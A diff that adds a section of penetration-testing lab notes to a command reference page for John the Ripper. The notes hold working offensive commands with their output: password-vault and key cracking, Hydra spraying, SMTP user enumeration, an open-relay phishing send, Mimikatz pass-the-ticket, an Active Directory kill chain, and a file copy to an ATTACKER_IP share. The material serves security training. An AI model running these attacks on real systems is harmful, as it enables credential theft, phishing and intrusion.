@@ -11,6 +11,8 @@ hideFooterPagination: true
 
 Replace UPPER_CASE values with your lab values.
 
+[Search this tool’s saved examples](/commands/notebook?tool=john) · [All tools](/index)
+
 ## Commands
 
 **Kali**
@@ -22,8 +24,609 @@ john --show hashes.txt
 
 [Find another command](/index) · [Ports](/enumeration/ports-cheatsheet)
 
-[More saved commands for this tool](https://dashboard-aed21664.mintlify.site/find-anything?q=john)
+## Notebook recipes
 
-## Learning and original examples
+31 additional examples, grouped by task. Saved as written; prompts, output, original lab values and older syntax may be included.
 
-- [John the Ripper and File Converters](/tools/john)
+<AccordionGroup>
+
+<Accordion title="7. Cracking loot">
+
+### 7. Cracking loot
+
+**Active Directory Attack Path: Worked Lab**
+
+```bash
+# download just the file (nxc is reliable through the pivot):
+proxychains nxc smb 172.16.119.10 -u bdavid -p '...' --share HR --get-file 'Archive\Employee-Passwords_OLD.psafe3' ~/loot/emp.psafe3
+# crack the master password:
+pwsafe2john ~/loot/emp.psafe3 > psafe.hash
+john --format=pwsafe --wordlist=/usr/share/wordlists/rockyou.txt psafe.hash
+#   (hashcat alt: hashcat -m 5200 ~/loot/emp.psafe3 rockyou.txt)
+# open it:
+passwordsafe ~/loot/emp.psafe3      # sudo apt install -y passwordsafe
+```
+
+</Accordion>
+
+<Accordion title="🗺️ The kill chain (this assessment)">
+
+### 🗺️ The kill chain (this assessment)
+
+**Active Directory Attack Path: Worked Lab**
+
+```text
+OSINT (Betty Jayde)
+   ↓  namebuster  → username list
+Password spraying (Hydra, SSH)
+   ↓  jbetty : Texas123!@#
+SSH foothold (DMZ01)
+   ↓  chisel / ligolo pivot into 172.16.119.0/24
+Credential discovery (.bash_history)
+   ↓  hwilliam : dealer-screwed-gym1
+SMB share looting (FILE01)
+   ↓  Employee-Passwords_OLD.psafe3
+Crack the vault (pwsafe2john + john)
+   ↓  bdavid, stom (OLD), hwilliam
+BloodHound → bdavid = local admin on JUMP01 ; stom ∈ Domain Admins
+   ↓
+RDP to JUMP01 as bdavid (local admin)
+   ↓  SeImpersonate → SYSTEM  (PrintSpoofer / GodPotato)
+Mimikatz → LSASS → stom's CURRENT password
+   ↓  stom : calves-warp-learning1  (Domain Admin)
+DCSync against DC01
+   ↓  Administrator NTLM + krbtgt
+FULL DOMAIN COMPROMISE
+```
+
+</Accordion>
+
+<Accordion title="EXPN Command">
+
+### EXPN Command
+
+**Attacking Email Services: Module Notes**
+
+```text
+grcic550@htb[/htb]$ telnet 10.10.110.20 25
+
+Trying 10.10.110.20...
+Connected to 10.10.110.20.
+Escape character is '^]'.
+220 parrot ESMTP Postfix (Debian/GNU)
+
+
+EXPN john
+
+250 2.1.0 john@inlanefreight.htb
+
+
+EXPN support-team
+
+250 2.0.0 carol@inlanefreight.htb
+250 2.1.5 elisa@inlanefreight.htb
+
+RCPT TO identifies the recipient of the email message. This command can be repeated multiple times for a given message to deliver a single message to multiple recipients.
+```
+
+</Accordion>
+
+<Accordion title="Hydra - Password Attack">
+
+### Hydra - Password Attack
+
+**Attacking Email Services: Module Notes**
+
+```text
+grcic550@htb[/htb]$ hydra -L users.txt -p 'Company01!' -f 10.10.110.20 pop3
+
+Hydra v9.1 (c) 2020 by van Hauser/THC & David Maciejak - Please do not use in military or secret service organizations or for illegal purposes (this is non-binding, these *** ignore laws and ethics anyway).
+
+Hydra (https://github.com/vanhauser-thc/thc-hydra) starting at 2022-04-13 11:37:46
+[INFO] several providers have implemented cracking protection, check with a small wordlist first - and stay legal!
+[DATA] max 16 tasks per 1 server, overall 16 tasks, 67 login tries (l:67/p:1), ~5 tries per task
+[DATA] attacking pop3://10.10.110.20:110/
+[110][pop3] host: 10.129.42.197   login: john   password: Company01!
+1 of 1 target successfully completed, 1 valid password found
+```
+
+</Accordion>
+
+<Accordion title="Open Relay">
+
+### Open Relay
+
+**Attacking Email Services: Module Notes**
+
+```text
+grcic550@htb[/htb]# swaks --from notifications@inlanefreight.com --to employees@inlanefreight.com --header 'Subject: Company Notification' --body 'Hi All, we want to hear from you! Please complete the following survey. http://mycustomphishinglink.com/' --server 10.10.11.213
+
+=== Trying 10.10.11.213:25...
+=== Connected to 10.10.11.213.
+<-  220 mail.localdomain SMTP Mailer ready
+ -> EHLO parrot
+<-  250-mail.localdomain
+<-  250-SIZE 33554432
+<-  250-8BITMIME
+<-  250-STARTTLS
+<-  250-AUTH LOGIN PLAIN CRAM-MD5 CRAM-SHA1
+<-  250 HELP
+ -> MAIL FROM:<notifications@inlanefreight.com>
+<-  250 OK
+ -> RCPT TO:<employees@inlanefreight.com>
+<-  250 OK
+ -> DATA
+<-  354 End data with <CR><LF>.<CR><LF>
+ -> Date: Thu, 29 Oct 2020 01:36:06 -0400
+ -> To: employees@inlanefreight.com
+ -> From: notifications@inlanefreight.com
+ -> Subject: Company Notification
+ -> Message-Id: <20201029013606.775675@parrot>
+ -> X-Mailer: swaks v20190914.0 jetmore.org/john/code/swaks/
+ -> 
+ -> Hi All, we want to hear from you! Please complete the following survey. http://mycustomphishinglink.com/
+ -> 
+ -> 
+ -> .
+<-  250 OK
+ -> QUIT
+<-  221 Bye
+=== Connection closed with remote host.
+
+GOOD BOXES TO SOLVE AFTER THIS: RABBIT, SNEAKYMAILER, REEL
+```
+
+**Common Services: Full Module Reference**
+
+```bash
+grcic550@htb[/htb]# swaks --from notifications@inlanefreight.com --to employees@inlanefreight.com --header 'Subject: Company Notification' --body 'Hi All, we want to hear from you! Please complete the following survey. http://mycustomphishinglink.com/' --server 10.10.11.213
+
+=== Trying 10.10.11.213:25...
+=== Connected to 10.10.11.213.
+<-  220 mail.localdomain SMTP Mailer ready
+ -> EHLO parrot
+<-  250-mail.localdomain
+<-  250-SIZE 33554432
+<-  250-8BITMIME
+<-  250-STARTTLS
+<-  250-AUTH LOGIN PLAIN CRAM-MD5 CRAM-SHA1
+<-  250 HELP
+ -> MAIL FROM:<notifications@inlanefreight.com>
+<-  250 OK
+ -> RCPT TO:<employees@inlanefreight.com>
+<-  250 OK
+ -> DATA
+<-  354 End data with <CR><LF>.<CR><LF>
+ -> Date: Thu, 29 Oct 2020 01:36:06 -0400
+ -> To: employees@inlanefreight.com
+ -> From: notifications@inlanefreight.com
+ -> Subject: Company Notification
+ -> Message-Id: <20201029013606.775675@parrot>
+ -> X-Mailer: swaks v20190914.0 jetmore.org/john/code/swaks/
+ ->
+ -> Hi All, we want to hear from you! Please complete the following survey. http://mycustomphishinglink.com/
+ ->
+ ->
+ -> .
+<-  250 OK
+ -> QUIT
+<-  221 Bye
+=== Connection closed with remote host.
+
+GOOD BOXES TO SOLVE AFTER THIS: RABBIT, SNEAKYMAILER, REEL
+```
+
+</Accordion>
+
+<Accordion title="RCPT TO Command">
+
+### RCPT TO Command
+
+**Attacking Email Services: Module Notes**
+
+```text
+grcic550@htb[/htb]$ telnet 10.10.110.20 25
+
+Trying 10.10.110.20...
+Connected to 10.10.110.20.
+Escape character is '^]'.
+220 parrot ESMTP Postfix (Debian/GNU)
+
+
+MAIL FROM:test@htb.com
+it is
+250 2.1.0 test@htb.com... Sender ok
+
+
+RCPT TO:julio
+
+550 5.1.1 julio... User unknown
+
+
+RCPT TO:kate
+
+550 5.1.1 kate... User unknown
+
+
+RCPT TO:john
+
+250 2.1.5 john... Recipient ok
+```
+
+</Accordion>
+
+<Accordion title="USER Command">
+
+### USER Command
+
+**Attacking Email Services: Module Notes**
+
+```text
+grcic550@htb[/htb]$ telnet 10.10.110.20 110
+
+Trying 10.10.110.20...
+Connected to 10.10.110.20.
+Escape character is '^]'.
++OK POP3 Server ready
+
+USER julio
+
+-ERR
+
+
+USER john
+
++OK
+```
+
+</Accordion>
+
+<Accordion title="Show Tables">
+
+### Show Tables
+
+**Attacking SQL Databases: Module Notes**
+
+```text
+mysql> SELECT * FROM users;
+
++----+---------------+------------+---------------------+
+| id | username      | password   | date_of_joining     |
++----+---------------+------------+---------------------+
+|  1 | admin         | p@ssw0rd   | 2020-07-02 00:00:00 |
+|  2 | administrator | adm1n_p@ss | 2020-07-02 11:30:50 |
+|  3 | john          | john123!   | 2020-07-02 11:47:16 |
+|  4 | tom           | tom123!    | 2020-07-02 12:23:16 |
++----+---------------+------------+---------------------+
+4 rows in set (0.00 sec)
+```
+
+</Accordion>
+
+<Accordion title="Misconfigurations">
+
+### Misconfigurations
+
+**Common Services: Full Module Reference**
+
+```bash
+grcic550@htb[/htb]$ telnet 10.10.110.20 25
+
+Trying 10.10.110.20...
+Connected to 10.10.110.20.
+Escape character is '^]'.
+220 parrot ESMTP Postfix (Debian/GNU)
+
+EXPN john
+
+250 2.1.0 john@inlanefreight.htb
+
+EXPN support-team
+
+250 2.0.0 carol@inlanefreight.htb
+250 2.1.5 elisa@inlanefreight.htb
+```
+
+**Common Services: Full Module Reference**
+
+```bash
+grcic550@htb[/htb]$ telnet 10.10.110.20 25
+
+Trying 10.10.110.20...
+Connected to 10.10.110.20.
+Escape character is '^]'.
+220 parrot ESMTP Postfix (Debian/GNU)
+
+MAIL FROM:test@htb.com
+it is
+250 2.1.0 test@htb.com... Sender ok
+
+RCPT TO:julio
+
+550 5.1.1 julio... User unknown
+
+RCPT TO:kate
+
+550 5.1.1 kate... User unknown
+
+RCPT TO:john
+
+250 2.1.5 john... Recipient ok
+```
+
+**Common Services: Full Module Reference**
+
+```bash
+grcic550@htb[/htb]$ telnet 10.10.110.20 110
+
+Trying 10.10.110.20...
+Connected to 10.10.110.20.
+Escape character is '^]'.
++OK POP3 Server ready
+
+USER julio
+
+-ERR
+
+USER john
+
++OK
+```
+
+</Accordion>
+
+<Accordion title="SQL Syntax">
+
+### SQL Syntax
+
+**Common Services: Full Module Reference**
+
+```bash
+mysql> SELECT * FROM users;
+
++----+---------------+------------+---------------------+
+| id | username      | password   | date_of_joining     |
++----+---------------+------------+---------------------+
+|  1 | admin         | p@ssw0rd   | 2020-07-02 00:00:00 |
+|  2 | administrator | adm1n_p@ss | 2020-07-02 11:30:50 |
+|  3 | john          | john123!   | 2020-07-02 11:47:16 |
+|  4 | tom           | tom123!    | 2020-07-02 12:23:16 |
++----+---------------+------------+---------------------+
+```
+
+**Common Services: Full Module Reference**
+
+```cmd
+1> SELECT * FROM users
+2> go
+
+id          username             password         data_of_joining
+----------- -------------------- ---------------- -----------------------
+          1 admin                p@ssw0rd         2020-07-02 00:00:00.000
+          2 administrator        adm1n_p@ss       2020-07-02 11:30:50.000
+          3 john                 john123!         2020-07-02 11:47:16.000
+          4 tom                  tom123!          2020-07-02 12:23:16.000
+
+(4 rows affected)
+```
+
+</Accordion>
+
+<Accordion title="SMB Uploads (WebDAV)">
+
+### SMB Uploads (WebDAV)
+
+**File Transfers for Linux and Windows**
+
+```cmd
+copy C:\Users\john\Desktop\file.zip \\<ATTACKER_IP>\DavWWWRoot\
+```
+
+</Accordion>
+
+<Accordion title="SSH (Port 22)">
+
+### SSH (Port 22)
+
+**Footprinting: Service-by-Service Lab Workflow**
+
+```bash
+# Password login
+ssh <user>@<IP>
+
+# Key-based login
+chmod 600 id_rsa
+ssh -i id_rsa <user>@<IP>
+
+# If key has passphrase — crack it
+ssh2john id_rsa > hash.txt
+john hash.txt --wordlist=/usr/share/wordlists/rockyou.txt
+```
+
+</Accordion>
+
+<Accordion title="*2john converters">
+
+### *2john converters
+
+**John the Ripper and File Converters**
+
+```bash
+ssh2john id_rsa > h ; john h --wordlist=rockyou.txt        # encrypted SSH key
+zip2john secret.zip > h
+# Other converter choices: rar2john, 7z2john, office2john (separate programs)
+keepass2john db.kdbx > h ; pdf2john file.pdf > h
+```
+
+</Accordion>
+
+<Accordion title="John the Ripper and File Converters">
+
+### John the Ripper and File Converters
+
+**John the Ripper and File Converters**
+
+```bash
+john --wordlist=/usr/share/wordlists/rockyou.txt hashes.txt
+john --show hashes.txt
+john --format=NT hashes.txt --wordlist=rockyou.txt
+```
+
+</Accordion>
+
+<Accordion title="Linux Authentication: PAM, passwd, and shadow">
+
+### Linux Authentication: PAM, passwd, and shadow
+
+**Linux Authentication: PAM, passwd, and shadow**
+
+```bash
+john --single /tmp/unshadow.hashes
+```
+
+</Accordion>
+
+<Accordion title="Attacking SSH">
+
+### Attacking SSH
+
+**Linux Remote Access: SSH, Rsync, and R-Services**
+
+```bash
+ssh2john id_rsa > id_rsa.hash             # convert the encrypted key to a crackable hash
+john --wordlist=/usr/share/wordlists/rockyou.txt id_rsa.hash   # recover the passphrase
+ssh -i id_rsa user@<IP>                   # now unlock the key with the cracked passphrase
+```
+
+</Accordion>
+
+<Accordion title="Step 3 — Use the ticket (lateral movement)">
+
+### Step 3 — Use the ticket (lateral movement)
+
+**Pass the Ticket from Windows**
+
+```cmd
+mimikatz # privilege::debug
+mimikatz # kerberos::ptt "C:\Users\Administrator.WIN01\Desktop\[0;1812a]-2-0-40e10000-john@krbtgt-INLANEFREIGHT.HTB.kirbi"
+mimikatz # exit
+
+c:\tools> powershell
+PS C:\tools> Enter-PSSession -ComputerName DC01
+[DC01]: PS C:\Users\john\Documents> whoami
+inlanefreight\john
+```
+
+</Accordion>
+
+<Accordion title="Crack Office documents &amp; PDFs">
+
+### Crack Office documents & PDFs
+
+**Password Attacks: Cracking, Files, and Credential Stores**
+
+```bash
+office2john.py Protected.docx > protected.hash
+john --wordlist=rockyou.txt protected.hash
+john protected.hash --show
+
+pdf2john.py PDF.pdf > pdf.hash      # same flow, different extractor
+john --wordlist=rockyou.txt pdf.hash
+```
+
+</Accordion>
+
+<Accordion title="Crack an encrypted SSH key">
+
+### Crack an encrypted SSH key
+
+**Password Attacks: Cracking, Files, and Credential Stores**
+
+```bash
+ssh2john.py SSH.private > ssh.hash
+john --wordlist=rockyou.txt ssh.hash
+john ssh.hash --show
+```
+
+</Accordion>
+
+<Accordion title="Cracking modes">
+
+### Cracking modes
+
+**Password Attacks: Cracking, Files, and Credential Stores**
+
+```bash
+john --single passwd
+```
+
+**Password Attacks: Cracking, Files, and Credential Stores**
+
+```bash
+john --wordlist=/usr/share/wordlists/rockyou.txt hashes.txt
+john --wordlist=rockyou.txt --rules hashes.txt     # apply mutation rules
+```
+
+**Password Attacks: Cracking, Files, and Credential Stores**
+
+```bash
+john --incremental hashes.txt
+```
+
+**Password Attacks: Cracking, Files, and Credential Stores**
+
+```bash
+grep '# Incremental modes' -A 100 /etc/john/john.conf   # view built-in charsets
+```
+
+**Password Attacks: Cracking, Files, and Credential Stores**
+
+```bash
+john --show hashes.txt
+```
+
+</Accordion>
+
+<Accordion title="ZIP files">
+
+### ZIP files
+
+**Password Attacks: Cracking, Files, and Credential Stores**
+
+```bash
+zip2john ZIP.zip > zip.hash
+john --wordlist=rockyou.txt zip.hash
+john zip.hash --show
+```
+
+</Accordion>
+
+<Accordion title="⏱️ DECISION HEADER — &quot;I have X, what do I do?&quot;">
+
+### ⏱️ DECISION HEADER — "I have X, what do I do?"
+
+**Password Attacks: Cracking, Files, and Credential Stores**
+
+Context from the notebook: /etc/shadow  (Linux) unshadow  →  john --single  then  --wordlist --rules Linux Authentication Process  ·  §3
+
+```text
+john --single
+```
+
+</Accordion>
+
+<Accordion title="SAM and SYSTEM files">
+
+### SAM and SYSTEM files
+
+**Windows Privilege Escalation: Full Checklist**
+
+Context from the notebook: Either crack it with  john -format=NT /root/sam.txt ,  hashcat  or use Pass-The-Hash.
+
+```text
+john -format=NT /root/sam.txt
+```
+
+</Accordion>
+
+</AccordionGroup>
